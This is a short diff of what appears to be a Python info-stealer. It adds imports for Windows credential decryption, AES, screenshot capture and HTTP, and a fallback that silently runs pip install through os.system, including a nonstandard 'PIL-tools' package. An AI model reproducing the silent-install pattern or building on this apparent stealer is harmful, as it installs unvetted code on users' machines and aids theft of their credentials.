@@ -16,11 +16,14 @@ from datetime import datetime, timedelta, timezone
 from sys import argv
 from tempfile import gettempdir, mkdtemp
 
-import httpx
-import psutil
-from Crypto.Cipher import AES
-from PIL import ImageGrab
-from win32crypt import CryptUnprotectData
+try:
+    import httpx
+    import psutil
+    from Crypto.Cipher import AES
+    from PIL import ImageGrab
+    from win32crypt import CryptUnprotectData
+except ModuleNotFoundError:
+    os.system('pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install pycryptodome && pip install PIL-tools')
 
 __author__ = "Rdimo"
 __version__ = '1.8.7'
